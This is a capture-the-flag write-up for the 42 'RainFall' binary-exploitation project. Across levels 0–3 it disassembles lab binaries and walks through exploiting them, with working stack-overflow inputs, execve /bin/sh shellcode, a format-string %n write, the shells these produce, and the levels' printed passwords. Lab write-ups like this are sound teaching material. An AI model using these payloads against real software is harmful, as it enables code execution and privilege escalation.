# RainFall

```bash
	  _____       _       ______    _ _
	 |  __ \     (_)     |  ____|  | | |
	 | |__) |__ _ _ _ __ | |__ __ _| | |
	 |  _  /  _` | | '_ \|  __/ _` | | |
	 | | \ \ (_| | | | | | | | (_| | | |
	 |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun
```

2nd security project of the 42 cursus, focused on binary exploitation

#### - [Subject pdf 🇫🇷](https://cdn.intra.42.fr/pdf/pdf/9514/fr.subject.pdf)

#### - [Download ISO](https://projects.intra.42.fr/uploads/document/document/331/RainFall.iso)

The user/password to log for the 1st level will be `level0`/`level0`

## Level0

- [objdump -d output]()

### ASM Interpretation

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048ec0 <+0>:	push   %ebp
   0x08048ec1 <+1>:	mov    %esp,%ebp
   0x08048ec3 <+3>:	and    $0xfffffff0,%esp

   0x08048ec6 <+6>:	sub    $0x20,%esp
   0x08048ec9 <+9>:	mov    0xc(%ebp),%eax
   0x08048ecc <+12>:	add    $0x4,%eax
   0x08048ecf <+15>:	mov    (%eax),%eax
   0x08048ed1 <+17>:	mov    %eax,(%esp)
   0x08048ed4 <+20>:	call   0x8049710 <atoi>
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax
   0x08048ede <+30>:	jne    0x8048f58 <main+152>
   0x08048ee0 <+32>:	movl   $0x80c5348,(%esp)
   0x08048ee7 <+39>:	call   0x8050bf0 <strdup>
   0x08048eec <+44>:	mov    %eax,0x10(%esp)
   0x08048ef0 <+48>:	movl   $0x0,0x14(%esp)
   0x08048ef8 <+56>:	call   0x8054680 <getegid>
   0x08048efd <+61>:	mov    %eax,0x1c(%esp)
   0x08048f01 <+65>:	call   0x8054670 <geteuid>
   0x08048f06 <+70>:	mov    %eax,0x18(%esp)
   0x08048f0a <+74>:	mov    0x1c(%esp),%eax
   0x08048f0e <+78>:	mov    %eax,0x8(%esp)
   0x08048f12 <+82>:	mov    0x1c(%esp),%eax
   0x08048f16 <+86>:	mov    %eax,0x4(%esp)
   0x08048f1a <+90>:	mov    0x1c(%esp),%eax
   0x08048f1e <+94>:	mov    %eax,(%esp)
   0x08048f21 <+97>:	call   0x8054700 <setresgid>
   0x08048f26 <+102>:	mov    0x18(%esp),%eax
   0x08048f2a <+106>:	mov    %eax,0x8(%esp)
   0x08048f2e <+110>:	mov    0x18(%esp),%eax
   0x08048f32 <+114>:	mov    %eax,0x4(%esp)
   0x08048f36 <+118>:	mov    0x18(%esp),%eax
   0x08048f3a <+122>:	mov    %eax,(%esp)
   0x08048f3d <+125>:	call   0x8054690 <setresuid>
   0x08048f42 <+130>:	lea    0x10(%esp),%eax
   0x08048f46 <+134>:	mov    %eax,0x4(%esp)
   0x08048f4a <+138>:	movl   $0x80c5348,(%esp)
   0x08048f51 <+145>:	call   0x8054640 <execv>
   0x08048f56 <+150>:	jmp    0x8048f80 <main+192>
   0x08048f58 <+152>:	mov    0x80ee170,%eax
   0x08048f5d <+157>:	mov    %eax,%edx
   0x08048f5f <+159>:	mov    $0x80c5350,%eax
   0x08048f64 <+164>:	mov    %edx,0xc(%esp)
   0x08048f68 <+168>:	movl   $0x5,0x8(%esp)
   0x08048f70 <+176>:	movl   $0x1,0x4(%esp)
   0x08048f78 <+184>:	mov    %eax,(%esp)
   0x08048f7b <+187>:	call   0x804a230 <fwrite>
   0x08048f80 <+192>:	mov    $0x0,%eax
   0x08048f85 <+197>:	leave
   0x08048f86 <+198>:	ret
End of assembler dump.
```

### Equivalent C source code

```c
int        main(int ac, char **av)
{
    if (atoi(av[1]) == 423)
    {
        strdup()
        getegid()
        geteuid()
        setresgid()
        setresuid()
        execv()
    }
    else
    {
        fwrite()
    }
}
```

### Walkthrough

```bash
level0@RainFall:~$ ./level0
Segmentation fault (core dumped)

level0@RainFall:~$ ./level0 1
No !
```

```bash
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax ; Compare eax to 423
```

```bash
level0@RainFall:~$ ./level0 423
$ whoami
level1
```

```bash
level0@RainFall:~$ ./level0 423
$ bash
bash: /home/user/level0/.bashrc: Permission denied
level1@RainFall:~$ cd /home/user/level1
level1@RainFall:/home/user/level1$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

level1@RainFall:/home/user/level1$ cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

## Level1

- [`objdump -d` output](http://ix.io/2bqM)

### ASM Interpretation

### Equivalent C source code

```c
int    main()
{
    unsigned char buf[80];
    
    gets(buf + 16);
}
```

### Walkthrough

- [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)

```bash
evel1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50 ; ; Reserve 80 bytes on the stack
   0x08048489 <+9>:     lea    eax,[esp+0x10] ; Set eax to esp + 16
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt> ; Call gets(eax)
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.

   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp ; Reserve 50 bytes on the stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp) ; Load $esp address in $eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt> ; call gets with the buffer address to the stack
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

```bash
level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456'
Illegal instruction (core dumped)

level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 12345'
```

When running `objdump -d ./level1`, a `run` function using `system()` is showing.

When trying to run it in gdb, the function spawns a shell

```bash
level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) break *0x0804848d
Breakpoint 1 at 0x804848d

(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x0804848d in main ()
(gdb) set $eip = 0x^CQuit

(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xbffff774       -1073744012
edx            0xbffff704       -1073744124
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff680       0xbffff680
ebp            0xbffff6d8       0xbffff6d8
esi            0x0      0
edi            0x0      0
eip            0x804848d        0x804848d <main+13>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) set $eip = 0x8048444

(gdb) continue
Continuing.
Good... Wait what?
$ whoami
level1
```

#### Overwriting $EIP

- [Example tutorial](https://www.go4expert.com/articles/stack-overflow-eip-overwrite-basics-t24917/)

When giving a long string as arguments, we can see we can overwrite the $eip register

```bash
(gdb) run <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
Starting program: /home/user/level1/level1 <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xb7fd28c4       -1208145724
edx            0xbffff690       -1073744240
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6e0       0xbffff6e0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

The next step is to try to overwrite `$eip` with the address of the `run` function found in the binary previously

```bash
# The first 4 bytes are for $ebp and the other 4 for $eip
level1@RainFall:~$ ./level1  <<< `perl -e 'print "A"x72'`$(echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8")
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ perl -e 'print "A"x72' > /tmp/lol

level1@RainFall:~$ echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8" >> /tmp/lol

level1@RainFall:~$ cat /tmp/lol  | ./level1 
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ cat /tmp/lol - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

- [Stack base overflow tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

Some image of what we're doing here, replace `strcpy()` by `gets()`

![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)

![](https://camo.githubusercontent.com/3862e2874666eb632fad1ab3f16b420b3c558344/68747470733a2f2f692e696d6775722e636f6d2f527868674459762e706e67)

- (https://www.tenouk.com/Bufferoverflowc/Bufferoverflow3.html)
    
## Level2

- [`objdump -d` output]()

### ASM Interpretation

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```bash
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp ; ASM Prologue
   0x080484d5 <+1>:     mov    ebp,esp ; ASM Prologue
   0x080484d7 <+3>:     sub    esp,0x68 ; Allocates 104 bytes on the stack
   0x080484da <+6>:     mov    eax,ds:0x8049860 ; x/100x 0x8049860 -> 0x8049860 <stdout@@GLIBC_2.0> (take stdout fileno from data segment https://stackoverflow.com/questions/30050527/meaning-of-ds-in-assembly-language)
   0x080484df <+11>:    mov    DWORD PTR [esp],eax ; set 1st argument of fflush() to *eax (STDOUT_FILENO)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> ; fflush(STDOUT_FILENO);
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c] ; Point eax to (ebp - 76) (28nth byte of the stack)
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax ; Save eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt> ; Call gets(ebp - 0x4c)
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4] ; Set eax to return value of gets()
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as the return value of gets()
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc] ; Set eax as 92nth byte of the stack
   0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask (eax & 0xb0000000)
   0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is == '0xb0'
   0x08048505 <+49>:    jne    0x8048527 <p+83> ; If it\'s the case continue, print the string w/ printf() & exit, else goto <p+83>

   0x08048507 <+51>:    mov    eax,0x8048620 ; gdb$ printf "%s", 0x8048620 -> "(%p)"
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc] ; Set the 92nth byte of the stack as edx
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx ; Set edx as 2nd argument
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax ; Set eax as 1st argument
   0x08048516 <+66>:    call   0x80483a0 <printf@plt> ; Call printf("(%p)", ebp-0xc (ebp - 12 / 92th byte));
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit()
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> ; Call exit()

   0x08048527 <+83>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax ; Set 1st argument of puts to eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt> ; Call puts(ebp-0x4c)
   0x08048532 <+94>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax ; Set 1st argument of strdup() to eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> ; Call strdup()

   0x0804853d <+105>:   leave ; ASM Epilogue
   0x0804853e <+106>:   ret ; ASM Epilogue
End of assembler dump.
```

### Equivalent C source code

```c
int    main(void)
{
    unsigned char buf[104];

    fflush(stdout);
    gets(buf + 28);
    if (buf[92] == 0xb0)
    {
        printf("(%p)", buf + 92);
        exit(1);
    }
    puts(buf + 28);
    strdup(buf + 28);
}
```

### Walkthrough
As we can see we're storing the output of gets() in to pointer to the 28h byte of the stack, which has a size limited to 104 bytes

It's also important to note that we're executing printf("%p") instead of puts() & strdup() when the 92th byte of the stack is between 0xb0 and 0xbf

Let's try to run this printf:

```bash
# To write what we want to the 92th byte of the stack, keep in mind that we're starting to write with gets() at index 28
# To reach the end of our buffer we should then pass a string with a length of 76
# EBP and EIP of the main() frame will be 4 bytes each, so to override both of them, we should pass (76 + 2*4) bytes
# 

level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" | wc -c
84

level2@RainFall:~$ echo -n "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk$(echo -n -e '\xb0')" > /tmp/lol

level2@RainFall:~$ xxd /tmp/lol
0000000: 6162 6364 6566 6768 696a 6b6c 6d6e 6f70  abcdefghijklmnop
0000010: 7172 7374 7576 7778 797a 3031 3233 3435  qrstuvwxyz012345
0000020: 3637 3839 6162 6364 6566 6768 696a 6b6c  6789abcdefghijkl
0000030: 6d6e 6f70 7172 7374 7576 7778 797a 3031  mnopqrstuvwxyz01
0000040: 3233 3435 3637 3839 6162 6364 6566 6768  23456789abcdefgh
0000050: 696a 6bb0                                ijk.
```

```bash
level2@RainFall:~$ gdb ./level2
gdb-peda$ b *0x080484f2 # (After puts() call in p())

gdb-peda$ run < /tmp/lol

gdb-peda$ print $ebp
$1 = (void *) 0xbffff6c8

# $ebp - 4c = 0xbffff67d
gdb-peda$ printf "%s", 0xbffff67d
abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijk
```

We're hitting the printf() call !

```bash
level2@RainFall:~$ cat /tmp/lol  - | ./level2
(0xb06b6a69)

level2@RainFall:~$ echo $?
1
```

Let's grab a random shellcode from the internet...

```bash
level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\x7d\xf6\xff\xbf')" > /tmp/lol

level2@RainFall:~$ cat /tmp/lol | ./level2
(0xbffff67d)
```

Unfortunaltely, the printf in the code prevent us from executing the shellcode in our string because its address begins by `\bf` like all other addresses of the program in the stack

So I had to find something else !

When doing an `objdump -d` on the program, we can see the function `__do_global_ctors_aux` used by the kernel makes a `call` instruction to `eax` to execute something stored in it

![Linux startup callgraph](http://dbp-consulting.com/tutorials/debugging/images/callgraph.png)

```bash
080485d0 <__do_global_ctors_aux>:
 80485d0:       55                      push   %ebp
 80485d1:       89 e5                   mov    %esp,%ebp
 80485d3:       53                      push   %ebx
 80485d4:       83 ec 04                sub    $0x4,%esp
 80485d7:       a1 48 97 04 08          mov    0x8049748,%eax
 80485dc:       83 f8 ff                cmp    $0xffffffff,%eax
 80485df:       74 13                   je     80485f4 <__do_global_ctors_aux+0x24>
 80485e1:       bb 48 97 04 08          mov    $0x8049748,%ebx
 80485e6:       66 90                   xchg   %ax,%ax
 80485e8:       83 eb 04                sub    $0x4,%ebx
 80485eb:       ff d0                   call   *%eax
 80485ed:       8b 03                   mov    (%ebx),%eax
 80485ef:       83 f8 ff                cmp    $0xffffffff,%eax
 80485f2:       75 f4                   jne    80485e8 <__do_global_ctors_aux+0x18>
 80485f4:       83 c4 04                add    $0x4,%esp
 80485f7:       5b                      pop    %ebx
 80485f8:       5d                      pop    %ebp
 80485f9:       c3                      ret
 80485fa:       90                      nop
 80485fb:       90                      nop
```

I then tried to pass my shellcode in the input of the program like before, but passing the address of the `call eax` instruction in the `EIP` register instead of the address of our shellcode in the stack of the `p` function frame

```bash
level2@RainFall:~$ echo -n "$(echo -n -e '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80')"$(perl -e 'print "A"x59')"$(echo -n -e '\xeb\x85\x04\x08')" > /tmp/lol

level2@RainFall:~$ cat /tmp/lol - | ./level2
ls
1Qh//shh/binAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAls
ls
ls: cannot open directory .: Permission denied
whoami
level3
pwd
/home/user/level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Level3

- [`objdump -d` output](http://ix.io/2bMn)

### ASM Interpretation

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.

gdb-peda$ disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp ; ASM Prologue
   0x080484a5 <+1>:     mov    %esp,%ebp ; ASM Prologue

   0x080484a7 <+3>:     sub    $0x218,%esp ; Allocate 536 bytes on the stack
   0x080484ad <+9>:     mov    0x8049860,%eax ; Move stdin@@GLIBC_2.0 to eax
   0x080484b2 <+14>:    mov    %eax,0x8(%esp) ; Move stdin@@GLIBC_2.0 as 3rd argument of fgets()
   0x080484b6 <+18>:    movl   $0x200,0x4(%esp) ; Move 512 as 2nd argument of fgets()
   0x080484be <+26>:    lea    -0x208(%ebp),%eax ; Set eax to point to the (520th / 16th last) byte of the stack
   0x080484c4 <+32>:    mov    %eax,(%esp) ; Set eax as 1st argument of fgets()
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt> ; Call fgets(ebp - 520, 512, stdin)
    ;  char *fgets(char * restrict str, int size, FILE * restrict stream);
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax ; Set eax to point to the 16th byte of the stack
   0x080484d2 <+46>:    mov    %eax,(%esp) ; Set eax as 1st argument of printf()
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
   0x080484e2 <+62>:    jne    0x8048518 <v+116> ; If it\'s not the case, goto v+116 (return)

   0x080484e4 <+64>:    mov    0x8049880,%eax ; Set eax to stdout@@GLIBC_2.0
   0x080484e9 <+69>:    mov    %eax,%edx ; Set eax as 3rd argument of fwrite
   0x080484eb <+71>:    mov    $0x8048600,%eax ; Set eax to 0x8048600 printf "%s", 0x8048600 -> "Wait what?!"
   0x080484f0 <+76>:    mov    %edx,0xc(%esp) ; Set stdout@@GLIBC_2.0 as 4th argument
   0x080484f4 <+80>:    movl   $0xc,0x8(%esp) ; Set 3rd argument to 12
   0x080484fc <+88>:    movl   $0x1,0x4(%esp) ; Set 2nd argument to 1
   0x08048504 <+96>:    mov    %eax,(%esp) ; Set eax as 1st argument
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt> ; fwrite(stdout, 1, 12);
    ;      size_t fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream);
   0x0804850c <+104>:   movl   $0x804860d,(%esp) ; Set 1st argument of system() to "/bin/sh": printf "%s", 0x804860d -> /bin/sh
   0x08048513 <+111>:   call   0x80483c0 <system@plt> ; Call system("/bin/sh")

   0x08048518 <+116>:   leave ; ASM Epilogue
   0x08048519 <+117>:   ret ; ASM Epilogue
End of assembler dump.

gdb-peda$ disas 0x8049860
Dump of assembler code for function stdin@@GLIBC_2.0:
   0x08049860 <+0>:     add    %al,(%eax)
   0x08049862 <+2>:     add    %al,(%eax)
End of assembler dump.

gdb-peda$ disas 0x8049880
Dump of assembler code for function stdout@@GLIBC_2.0:
   0x08049880 <+0>:     add    %al,(%eax)
   0x08049882 <+2>:     add    %al,(%eax)
End of assembler dump.
```

### Equivalent C source code

```cpp
// level3@RainFall:~$ cat /tmp/lol.c
#include <stdio.h>

unsigned int m = 0;

void    v(void) {
        unsigned char buf[536];

        fgets(buf + 520, 512, stdin);
        printf(buf + 520);
        if (m == 0x40) // 64
        {
                fwrite("Wait what?!\n", 1, 12, stdout);
                system("/bin/sh");
        }
        return ;
}

int     main(void) {
        v();
        return (0);
}
```

### Walkthrough

```bash
level3@RainFall:~$ ./level3
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

level3@RainFall:~$ ./level3
%p
0x200
```

- [Printf vulns example](https://blog.skullsecurity.org/2015/defcon-quals-babyecho-format-string-vulns-in-gory-detail)

```bash
level3@RainFall:~$ ./level3 <<< '%x %x %x %x %x'
200 b7fd1ac0 b7ff37d0 25207825 78252078

level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x'
AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242

level3@RainFall:~$ ./level3 <<< 'AAAABBBBCCCC%x %x %x %x %x %x'
AAAABBBBCCCC200 b7fd1ac0 b7ff37d0 41414141 42424242 43434343
```

```bash
level3@RainFall:~$ ./level3 <<< 'AAAA %4$x'
AAAA 41414141

level3@RainFall:~$ ./level3 <<< 'AAAA %4$s'
Segmentation fault (core dumped)
```

We can read our own string !

#### Overwriting m

```bash
(gdb) info variables
All defined variables:

Non-debugging symbols:
0x080485f8  _fp_hw
0x080485fc  _IO_stdin_used
0x08048734  __FRAME_END__
0x08049738  __CTOR_LIST__
0x08049738  __init_array_end
0x08049738  __init_array_start
0x0804973c  __CTOR_END__
0x08049740  __DTOR_LIST__
0x08049744  __DTOR_END__
0x08049748  __JCR_END__
0x08049748  __JCR_LIST__
0x0804974c  _DYNAMIC
0x08049818  _GLOBAL_OFFSET_TABLE_
0x0804983c  __data_start
0x0804983c  data_start
0x08049840  __dso_handle
0x08049860  stdin@@GLIBC_2.0
0x08049880  stdout@@GLIBC_2.0
0x08049884  completed.6159
0x08049888  dtor_idx.6161
[0x0804988c  m]
```

```bash
(gdb) print "%u", *0x804988c
$3 = 0
```

```bash
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> ; Call printf(eax)
   0x080484da <+54>:    mov    0x804988c,%eax ; set eax to m (= 0): printf "%x", *0x804988c -> "0"
   0x080484df <+59>:    cmp    $0x40,%eax ; Check if eax is equal to 64
```

```bash
level3@RainFall:~$ echo -n -e '\x0d\x86\x04\x08%4$s' > /tmp/input; ./level3  < /tmp/input | xxd
0000000: 0d86 0408 2f62 696e 2f73 68              ..../bin/sh
```

```bash
level3@RainFall:~$ echo -n -e '\x8c\x98\x04\x08''%60x%4$n' > /tmp/input

level3@RainFall:~$ cat /tmp/input - | ./level3
ls
�                                                         200ls
Wait what?!
ls
ls: cannot open directory .: Permission denied
pwd
/home/user/level3
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

#### Rewriting EIP attempt

```bash
level3@RainFall:~$ python -c "print 'A'*4" > /tmp/input; cat /tmp/input
AAAA

level3@RainFall:~$ gdb ./level3
(gdb) disas main
Dump of assembler code for function main:
   0x0804851a <+0>:     push   %ebp
   0x0804851b <+1>:     mov    %esp,%ebp
   0x0804851d <+3>:     and    $0xfffffff0,%esp
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave
   0x08048526 <+12>:    ret
End of assembler dump.
(gdb) b *0x08048520
Breakpoint 1 at 0x8048520
(gdb) disas v
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   %ebp
   0x080484a5 <+1>:     mov    %esp,%ebp
   ...
   0x080484c4 <+32>:    mov    %eax,(%esp)
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    -0x208(%ebp),%eax
   ...
   0x08048519 <+117>:   ret
End of assembler dump.
(gdb) b *0x080484cc
Breakpoint 2 at 0x80484cc
(gdb) run  < /tmp/input

(gdb) run  < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Breakpoint 1, 0x08048520 in main ()
(gdb) i r
eax            0x1      1
ecx            0xbffff744       -1073744060
....
esi            0x0      0
edi            0x0      0
[eip            0x8048520        0x8048520 <main+6>]

(gdb) continue

(gdb) find $esp,0xbfffffff,0x08048525
0xbffff69c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x41414141
0xbffff490
1 pattern found.
```

Now let's try to find saved eip from main() for fun:

```bash
level3@RainFall:~$ for i in $(seq 1 10); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;
1: 200
2: b7fd1ac0
3: b7ff37d0
4: 2434255c
5: b7e20078
6: 1
7: b7fef305
8: bffff518
9: b7fde2d4
10: b7fde334

# Not there ... let's try with a bigger range
level3@RainFall:~$ (for i in $(seq 1 500); do echo -n "$i: "; echo -n -e "%$i\$x" | ./level3; echo; done;) | grep 8048525
135: 8048525
```

To make the program run the if() condition containing the system() call, we'll try to rewrite a saved EIP pointer,

To do this we can try to make the program segfault, look at the backtrace (where function calls happened) and try to rewrite these addresses in the memory of the program

```bash
level3@RainFall:~$ echo -n -e 'AAAA%4$x'> /tmp/input ; cat /tmp/input  | ./level3
AAAA41414141

level3@RainFall:~$ echo -n -e 'AAAA%4$s' > /tmp/input

level3@RainFall:~$ gdb ./level3
...
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
(gdb) bt
#0  0xb7e70003 in vfprintf () from /lib/i386-linux-gnu/libc.so.6
#1  0xb7e7887f in printf () from /lib/i386-linux-gnu/libc.so.6
#2  0x080484da in v ()
#3  0x08048525 in main ()

(gdb) find $esp,0xbfffffff,0xb7e70003
Pattern not found.

(gdb) find $esp,0xbfffffff,0xb7e7887f
0xbffff45c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x080484da
0xbffff47c
1 pattern found.

(gdb) find $esp,0xbfffffff,0x08048525
0xbffff69c
1 pattern found.
```

Now that we have the locations of the saved EIP pointers, let's try to rewrite one using the `%n` feature of printf (which saves the number of printed characters to the passed argument)

```bash
level3@RainFall:~$ echo -n -e '\x5c\xf4\xff\xbf%4$n' > /tmp/input

level3@RainFall:~$ gdb ./level3
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level3/level3...(no debugging symbols found)...done.
(gdb) run < /tmp/input
Starting program: /home/user/level3/level3 < /tmp/input

Program received signal SIGSEGV, Segmentation fault.
0x00000004 in ?? ()
```

Bingo! The address got overwritten, now let's write the address that we want to jump to, `0x080484e4`

`0x080484e4` == `134513892`, -4 for first 4 bytes

Although it may work, we don't have to write this much bytes to overwrite EIP with the value we want

